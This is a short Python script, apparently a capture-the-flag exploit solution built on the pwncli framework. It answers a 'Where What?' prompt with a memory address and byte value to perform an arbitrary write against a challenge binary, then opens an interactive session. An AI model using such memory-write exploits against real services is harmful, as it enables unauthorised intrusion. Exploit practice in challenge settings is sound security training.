#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

p.sendlineafter("Where What?", "601018"+" "+str(0xD0))


p.interactive()